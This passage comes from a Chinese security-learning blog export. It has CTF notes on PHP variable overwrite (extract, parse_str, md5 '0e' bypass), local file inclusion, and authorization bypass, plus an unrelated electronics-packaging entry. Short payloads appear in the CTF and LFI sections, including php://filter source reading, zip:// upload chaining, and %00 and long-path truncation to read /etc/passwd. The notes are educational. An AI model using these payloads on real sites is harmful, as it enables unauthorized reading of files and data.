<td>可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。</td>
</tr>
</tbody></table>
<ul>
<li>从以上说明我们可以看到第一个参数是必须的，<strong>会不会导致变量覆盖漏洞由第二个参数决定</strong></li>
</ul>
<p><strong>3. 例子</strong></p>
<pre><code>    &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt;
        &lt;?php
        extract($_POST);
        if ($pass == $thepassword_123) { ?&gt;
            &lt;div class=&quot;alert alert-success&quot;&gt;
                &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
            &lt;/div&gt;
        &lt;?php } ?&gt;
    &lt;?php } ?&gt;</code></pre><p>题目意思是要POST一个pass数据，<font color="red">extract($_POST)</font>会将POST的数据中的<strong>键名和键值</strong>转换为相应的<strong>变量名和变量值</strong>，利用这个覆盖$pass和$thepassword_123变量的值，从而满足$pass == $thepassword_123这个条件。</p>
<p>POC:</p>
<pre><code>pass=&amp;thepassword_123=   //用POST传入</code></pre><hr>
<h4 id="parse-str-使用不当"><a href="#parse-str-使用不当" class="headerlink" title="parse_str()使用不当"></a>parse_str()使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 </li>
</ul>
<p><strong>2. 语法</strong></p>
<pre><code>parse_str(string,array)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>strings</td>
<td>必需。规定要解析的字符串</td>
</tr>
<tr>
<td>array</td>
<td>可选。规定储存变量的数组名称。该参数指示变量将被存储到数组中。</td>
</tr>
</tbody></table>
<p><strong>3. 例子</strong></p>
<pre><code>&lt;?php

error_reporting(0);

if (empty($_GET[&#39;id&#39;])) {

    show_source(__FILE__);

    die();

} else {

    include (‘flag.php’);

    $a = “www.OPENCTF.com”;

    $id = $_GET[&#39;id&#39;];

    @parse_str($id);

    if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) {

        echo $flag;

    } else {

        exit(‘其实很简单其实并不难！’);

    }

}

?&gt;</code></pre><p><strong>分析</strong>: </p>
<ol>
<li><p>首先要求使用GET提交id参数，然后<strong>parse_str($id)对id参数的数据进行处理</strong></p>
</li>
<li><p><strong>再使用判断$a[0] != ‘QNKCDZO’&amp;&amp;md5($a[0]) == md5(‘QNKCDZO’)的结果是否为真</strong>，为真就返回flag</p>
</li>
<li><p>md5(‘QNKCDZO’)的结果是0e830400451993494058024219903391由于此次要满足$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)</p>
</li>
<li><p>所以要<strong>利用php弱语言特性</strong>，0e123会被当做科学计数法，0*10x123。所以<font color="green">需要找到一个字符串md5后的结果是0e开头后面都是数字的</font>，如，240610708，s878926199a </p>
</li>
</ol>
<p>POC:</p>
<pre><code>?id=a[0]=s878926199a //?id=a[0]=240610708</code></pre>]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含之LFI学习</title>
    <url>/2019/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8BLFI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p><strong>文件包含漏洞主要是由四种函数造成的</strong>：</p>
<ol>
<li>include()</li>
<li>require()</li>
<li>include_once()</li>
<li>require_once()</li>
</ol>
<a id="more"></a>

<ul>
<li>用这四类函数包含文件时，文件会被当做PHP代码来执行</li>
</ul>
<p><strong>include和require的区别：</strong></p>
<ol>
<li>include是<strong>当代码执行到它所在行</strong>才开始包含文件，如果有错，仍继续执行下去</li>
<li>require<strong>是当程序执行</strong>就立即包含文件，有错时会停止并发出警告</li>
</ol>
<p><strong>文件包含漏洞类型</strong></p>
<ol>
<li>本地文件包含（LFI）</li>
<li>远程文件包含（RFI）<blockquote>
<p>当php.ini中，设置allow_url_include=On,allow_url_fopen=on.即可执行远程代码</p>
</blockquote>
</li>
</ol>
<hr>
<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><ul>
<li><strong>从URL判断</strong><br>URL中path、dir、file、page、p、eng等等都可能存在文件包含漏洞<pre><code>http://www.example.com/?file=xxx.php</code></pre></li>
</ul>
<hr>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>1. 直接修改参数</strong></p>
<pre><code>&lt;?php
    if(isset($_GET[&#39;file&#39;])
    {
        include &#39;$_GET[&#39;file&#39;]&#39;;
    }else{
        include &#39;index.php&#39;；
    }
?&gt;</code></pre><p>比如网站的url为：</p>
<pre><code>http://www.example.com/?file=index.php</code></pre><p>将<strong>index.php</strong>改为<strong>flag.php</strong></p>
<pre><code>http://www.example.com/?file=flag.php</code></pre><p>即可输出<strong>flag.php</strong>的内容</p>
<p>也可将<strong>?file=index.php</strong>改为<strong>../xxx.php</strong></p>
<pre><code>http://www.example.com/?file=../xxx.php</code></pre><p>即可返回<strong>上一级目录下</strong>的xxx.php文件的内容</p>
<ul>
<li><strong>既然这样,我们就可以使用./(当前目录)、../(上级目录)对整个目录进行遍历,也就可以获取敏感的文件</strong></li>
</ul>
<hr>
<p><strong>2. 利用PHP伪协议</strong></p>
<ul>
<li><strong>php://input</strong></li>
</ul>
<p>php://input可以读取没有处理过的==POST==数据。<strong>但当enctype=’multipart/form-data’的时候php://input是无效的。</strong></p>
<p><img src="https://images2017.cnblogs.com/blog/1274619/201711/1274619-20171109171422763-1355830569.png" alt="image"></p>
<ul>
<li><strong>php://filter</strong></li>
</ul>
<p>用它在没有特殊情况下可以进行任意文件的读取。一般与<strong>base64编码</strong>合用，以base64编码的格式来把源代码显示出来。</p>
<p><strong>poc: php://filter/read=convert.base64-encode/resource=xxx.php</strong></p>
<p>南邮的ctf题目(文件包含)为例<br><a href="http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php" target="_blank" rel="noopener">nctf文件包含</a></p>
<ul>
<li><strong>zip协议</strong></li>
</ul>
<p>关于zip协议：可配合<strong>文件上传漏洞</strong>打组合拳</p>
<p><strong>利用方法：zip://test.jpg#dir/test.php</strong></p>
<p><font color="green">先新建一个test.php,里面写个phpinfo,然后压缩成.zip,然后把zip的名字改成test.jpg后把这个jpg文件上传上去 然后使用zip协议包含.</font></p>
<hr>
<p><strong>3. 包含系统的各种日志。</strong></p>
<p>如apache日志，文件系统日志等。其中apache当记录格式为combined。再比如ngnix日志，默认路径为/var/log/ngnix/access.log</p>
<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuoj的一道ctf题</a></p>
<p>……</p>
<hr>
<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><pre><code>&lt;?php
    include $_GET[&#39;page&#39;].&quot;.php&quot;;

?&gt;</code></pre><p>以上代码是防御LFI漏洞的其中一种方式<br>绕过方式也很简单</p>
<p><strong>1. 00截断</strong></p>
<p>(1) /etc/passwd%00,访问文件</p>
<p>(2) %00目录遍历</p>
<p><strong>2. 使用长目录截断</strong><br>/etc/passwd/././././././.[……]/./././././.<br>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
<blockquote>
<p>截断要考虑两个问题magic_quotes_gpc（）和PHP版本（5.3.4以下）。</p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>元器件封装学习</title>
    <url>/2019/10/26/%E5%85%83%E5%99%A8%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h1 id="元器件封装大全"><a href="#元器件封装大全" class="headerlink" title="元器件封装大全"></a>元器件封装大全</h1><p>[Toc]</p>
<h2 id="元器件封装的类型"><a href="#元器件封装的类型" class="headerlink" title="元器件封装的类型"></a><strong>元器件封装的类型</strong></h2><h3 id="1-直插式元器件封装"><a href="#1-直插式元器件封装" class="headerlink" title="1.直插式元器件封装"></a>1.直插式元器件封装</h3><ul>
<li>直插式元器件封装的焊板一般贯穿整个电路板，从顶层穿下，在底层进行元器件的引脚焊接<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=669721767,1282905816&fm=26&gp=0.jpg" alt></li>
</ul>
<a id="more"></a>

<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3969731901,1763990907&fm=26&gp=0.jpg" alt></p>
<hr>
<h3 id="2-表贴式元器件封装"><a href="#2-表贴式元器件封装" class="headerlink" title="2.表贴式元器件封装"></a>2.表贴式元器件封装</h3><ul>
<li>表贴式元器件指其焊板只附着在电路板的底层或顶层，元器件的焊接是在装配元器件的工作层面进行的</li>
</ul>
<p><img src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=1114591927,3342303898&fm=26&gp=0.jpg" alt><br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=56149140,3725002996&fm=26&gp=0.jpg" alt></p>
<ul>
<li><font color="red">在PCB元器件库中，表贴式元器件的封装的引脚一般为红色，表示处在电路板的顶层（Top Layer）</font></li>
</ul>
<hr>
<h2 id="常用元器件的原理图符号和元器件封装"><a href="#常用元器件的原理图符号和元器件封装" class="headerlink" title="常用元器件的原理图符号和元器件封装"></a><strong>常用元器件的原理图符号和元器件封装</strong></h2><h3 id="1-电阻"><a href="#1-电阻" class="headerlink" title="1.电阻"></a>1.电阻</h3><ul>
<li>固定电阻</li>
</ul>
<blockquote>
<p>RT型碳膜电阻</p>
</blockquote>
<blockquote>
<p>RJ型金属膜电阻</p>
</blockquote>
<blockquote>
<p>RX型线绕电阻</p>
</blockquote>
<blockquote>
<p>片状电阻</p>
</blockquote>
<ul>
<li>固定电阻原理图常用符号名称：</li>
</ul>
<blockquote>
<p>1.RES1</p>
</blockquote>
<blockquote>
<p>2.RES2</p>
</blockquote>
<ul>
<li>常用的引脚封装形式：AXIAL-0.3、AXIAL-0.4、AXIAL-0.5、AXIAL-0.6、AXIAL-0.7、AXIAL-0.8、AXIAL-0.9、AXIAL-1.0等</li>
</ul>
<blockquote>
<p>后缀数字代表两个焊盘的间距，单位为英寸<br>后缀数字越大，元器件的外形尺寸就越大，说明该电阻的额定功率越大</p>
</blockquote>
<hr>
<ul>
<li>可变电阻</li>
</ul>
<blockquote>
<p>电位器属于可变电阻，是一种连续可调的电阻器，其电阻值在一定范围内是连续可调的</p>
</blockquote>
<blockquote>
<p>电位器的种类：1.线绕电阻 2.碳膜电位器</p>
</blockquote>
<hr>
<ul>
<li>特种电阻</li>
</ul>
<hr>
<ul>
<li>特殊电阻：热敏电阻、湿敏电阻、压控电阻等</li>
</ul>
<hr>
<ul>
<li><p><font color="blue">将多个电阻集成在一个封装内，从而形成电阻桥以及各种电阻排</font></p>
</li>
<li><p><font color="red">由于种类与型号繁多，选用时应靠实际需求选型</font></p>
</li>
</ul>
<hr>
<hr>
<h3 id="2-电容"><a href="#2-电容" class="headerlink" title="2.电容"></a>2.电容</h3><ul>
<li>种类：钽电容、瓷片电容、独石电容、 CBB 电容和电解电容等。</li>
<li>根据极性不同分为：无极性电容和有极性电容</li>
<li>根据电容值是否可调分为：固定电容和可调电容</li>
</ul>
<hr>
<ul>
<li>无极性电容</li>
</ul>
<blockquote>
<p>原理图符号：<img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=1293600099,2681577360&fm=26&gp=0.jpg" alt></p>
</blockquote>
<blockquote>
<p>封装形式：RAD（从RAD-0.1 ~ RAD-0.4，后缀数字代表焊盘间距，单位为英寸）</p>
</blockquote>
<blockquote>
<p>常见的无极性电容主要有瓷片电容、独石电容和CBB电容</p>
</blockquote>
<hr>
<ul>
<li>有极性电容</li>
</ul>
<blockquote>
<p>原理图符号：<img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=3198731425,16729189&fm=26&gp=0.jpg" alt></p>
</blockquote>
<blockquote>
<p>封装形式：RB（从RB-.2/.4 ~ RB- .5/1.0，前一个后缀数字的表示焊盘间距，后一个代表电容外型直径，单位都为英寸）</p>
<blockquote>
<p>一般来讲，标准尺<br>寸的电解电容的外形尺寸是焊盘间距的两倍。</p>
</blockquote>
</blockquote>
<ul>
<li><font color="red">一般来说，电容封装形式名称的后缀数值越大，相应的电容容量也越大</font></li>
</ul>
<hr>
<hr>
<h3 id="3-二极管"><a href="#3-二极管" class="headerlink" title="3.二极管"></a>3.二极管</h3><ul>
<li><p>种类：普通二极管、发光二极管、稳压二极管、快恢复二极管以及二极管指示灯、由多个发光二极管构成的七段数码管</p>
</li>
<li><p>原理图名称：DIODE （普通二极管） 、DIODE SCHOTTKY （肖特基二极管） 、DIODE TUNNEL （隧道二极管） 、DIODE VARACTOR （变容二极<br>管）和 ZENER1 ～ 3（稳压二极管） </p>
</li>
<li><p>常见封装：DIODE-0.4 、DIODE-0.7（后缀为焊盘间距，单位为英寸)和TO-220</p>
</li>
</ul>
<hr>
<hr>
<h3 id="4-二极管"><a href="#4-二极管" class="headerlink" title="4.二极管"></a>4.二极管</h3><ul>
<li><p>种类（根据PN结方向）：NPN型和PNP型（<font color="blue">晶体管外形完全相同，都包括 3 个引脚，即 b（基极） 、 c（集电极）和 e（发射极）</font>）</p>
</li>
<li><p>原理图符号：NPN、NPN1、PNP、PNP1</p>
<blockquote>
<p><font color="orange">达林顿复合管：将两个晶体管集成在一个元器件封装里（具有较大放大倍数）</font></p>
</blockquote>
</li>
<li><p>常见封装：TO-18（普通三极管）、TO-220（大功率三极管）、TO-3（大功率达林顿管）和TO-92A（普通三极管）</p>
</li>
</ul>
<hr>
<hr>
<h3 id="5-三端稳压源（78和79系列）"><a href="#5-三端稳压源（78和79系列）" class="headerlink" title="5.三端稳压源（78和79系列）"></a>5.三端稳压源（78和79系列）</h3><ul>
<li>种类：<blockquote>
<p>（输出电压的极性来分）三端稳压源可分为 78 系列和 79 系列两种。一般地，<font color="red"> 78 系列</font><br>的输出极性为<strong>正</strong>，比如“7805”、“7806”、“7810”、“7812”、“7815”和“7820”等；<font color="blue">79系列</font>的输出极性为<strong>负</strong>，比如 “7905”、“7912”、“7915”和“7918”等。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>(按输出电压的幅值是否可调)三端稳压源可分为<strong>电压固定</strong>和<strong>电压可调</strong>两种</p>
</blockquote>
<ul>
<li>原理图名称：VOLTREG</li>
<li>在实际使用过程中，用户常常在稳压源上附加<strong>散热片</strong>，以避免稳压源长时间工作在大负载下，散热条件不足，从而造成过高的温升而损坏元器件和电路板</li>
</ul>
<hr>
<hr>
<h3 id="6-整流桥"><a href="#6-整流桥" class="headerlink" title="6.整流桥"></a>6.整流桥</h3><p><img src="http://f11.baidu.com/it/u=522128679,919315213&fm=72" alt></p>
<ul>
<li>原理图符号：BRIDGE1 和 BRIDGE2</li>
</ul>
<hr>
<hr>
<h3 id="7-接插件"><a href="#7-接插件" class="headerlink" title="7.接插件"></a>7.接插件</h3><ul>
<li>种类：单排插座、双排插座和一些专用的接口</li>
</ul>
<hr>
<hr>
<h3 id="8-双列直插式集成电路芯片"><a href="#8-双列直插式集成电路芯片" class="headerlink" title="8.双列直插式集成电路芯片"></a>8.双列直插式集成电路芯片</h3><ul>
<li>方便安装与调试</li>
<li>在电路板调试过程中，常常在电路板上焊接IC座，然后将集成电路芯片插在IC座上，这样可以方便集成电路芯片的拆卸</li>
<li>IC座：</li>
</ul>
<p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=4237591663,3561416429&fm=26&gp=0.jpg" alt></p>
<hr>
<hr>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h2><ul>
<li>贴片电阻的元器件封装通常用数字表示，比如“0805”。这里的0805表示的贴片电阻的封装尺寸，与具体阻值没有关系，但与<font color="red">功率</font>有关。</li>
<li>一般情况下，贴片电阻的封装尺寸对其功率有以下关系：</li>
</ul>
<table>
<thead>
<tr>
<th>后缀</th>
<th>功率</th>
</tr>
</thead>
<tbody><tr>
<td>0402</td>
<td>1/16w</td>
</tr>
<tr>
<td>0603</td>
<td>1/10w</td>
</tr>
<tr>
<td>0805</td>
<td>1/8w</td>
</tr>
<tr>
<td>1206</td>
<td>1/4w</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>越权漏洞学习</title>
    <url>/2019/10/26/%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li>越权，顾名思义就是超出权限范围进行操作。</li>
</ul>
<a id="more"></a>

<ul>
<li>多数WEB应用都具备权限划分和控制，但是如果权限控制功能设计存在缺陷，那么攻击者就可以通过这些缺陷来访问未经授权的功能或数据，这就是我们通常说的越权漏洞。</li>
<li>越权漏洞的==成因==主要是因为开发人员在对数据进++行增、删、改、查询++时对客户端请求的数据过分相信而遗漏了<font color="green">权限的判定</font>。所以测试越权就是和开发人员拼细心的过程。</li>
</ul>
<hr>
<h2 id="主要攻击场景"><a href="#主要攻击场景" class="headerlink" title="主要攻击场景"></a>主要攻击场景</h2><h2 id><a href="#" class="headerlink" title></a><img src="https://image.3001.net/images/20181031/1540965763_5bd945834fb0d.jpg!small" alt="image"></h2><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1. 水平越权"></a>1. 水平越权</h3><ul>
<li>水平越权指的是攻击者尝试访问与他拥有==相同权限==的用户的资源</li>
</ul>
<blockquote>
<p>比如某系统中有个人资料这个功能，A账号和B账号都可以访问这个功能，但是A账号的个人信息和B账号的个人信息不同，可以理解为A账号和B账号个人资料这个功能上具备水平权限的划分。此时，A账号通过攻击手段访问了B账号的个人资料，这就是水平越权漏洞。</p>
</blockquote>
<ul>
<li>水平越权主要有三种攻击场景：</li>
</ul>
<ol>
<li>基于用户身份的ID: </li>
</ol>
<p>在使用某个功能时通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</p>
<ol start="2">
<li>基于对象的ID:</li>
</ol>
<p>在使用某个功能时通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</p>
<ol start="3">
<li>基于文件名</li>
</ol>
<p>在使用某个功能时通过文件名直接访问文件，最常见于用户==上传文件==的场景。</p>
<hr>
<h3 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h3><ul>
<li>垂直越权指的是一个==低==级别攻击者尝试访问==高==级别用户的资源。</li>
</ul>
<blockquote>
<p>比如说某个系统分为普通用户和管理员，管理员有系统管理功能，而普通用户没有，那我们就可以理解管理功能具备垂直权限划分，如果普通用户能利用某种攻击手段访问到管理功能，那我们就称之为垂直越权。</p>
</blockquote>
<ul>
<li>垂直越权主要有两种攻击场景:</li>
</ul>
<ol>
<li>未认账账户访问无需认证后能访问该功能</li>
<li>不具备某个功能权限的账户认证后成功访问该功能</li>
</ol>
<hr>
<h3 id="3-权限框架缺陷"><a href="#3-权限框架缺陷" class="headerlink" title="3. 权限框架缺陷"></a>3. 权限框架缺陷</h3><ul>
<li>权限控制框架是实现权限控制功能的基础，如果权限控制框架本身存在缺陷容易被攻陷会导致权限控制功能完全失效。</li>
</ul>
<blockquote>
<p>在cookie中使用简单的权限标识来标记用户的权限等级或使用用户请求参数中所带的简单用户ID来控制用户权限，是典型的权限框架缺陷。</p>
</blockquote>
<hr>
<h2 id="具体案例："><a href="#具体案例：" class="headerlink" title="具体案例："></a>具体案例：</h2><ol>
<li>在一个提交订单的页面，抓取提交的数据包</li>
</ol>
<p><img src="https://image.3001.net/images/20181031/1540966016_5bd94680f2295.jpg!small" alt="image"><br>发现有一个oid的参数很可疑，尝试进行测试发现，可遍历订单号，查看他人待付款订单信息。<br><img src="https://image.3001.net/images/20181031/1540966045_5bd9469d6ec63.jpg!small" alt="image"></p>
<p>以上为水平越权。</p>
<ol start="2">
<li>站点后使用js跳转来限制未授权用户访问。<pre><code>&lt;script language=&quot;javascript&quot;&gt;
//alert(&quot;非法操作&quot;);
location=&#39;login.php&#39;;
&lt;/script&gt;</code></pre>所以我们只要==去掉js==就能成功访问后台，且可操作<br><img src="https://image.3001.net/images/20181031/1540966271_5bd9477f50f9d.jpg!small" alt="image"></li>
</ol>
<p>以上为垂直越权</p>
<hr>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul>
<li>采用成熟的权限管理框架：如spring security</li>
<li>用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）优先采用<font color="red">在服务端关联session或加密后放在session中的方式获取</font>。</li>
<li>必须采用表单或其他参数提交用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）时，应尽可能采用++难以猜测的构造方式++（增加字母及随机数字等）或++采用复杂的加密算法加密++后提交，应对客户端提交的凭证与会话的权限进行严格的验证，如提交的产品号码是否为隶属于登录用户的产品号码。</li>
<li>对管理功能模块进行严格的权限验证，如非必要建议不对互联网开放或进行网络层的访问控制。</li>
</ul>
<hr>
<p><a href="https://www.freebuf.com/column/188068.html" target="_blank" rel="noopener">转自Freebuf</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
</search>
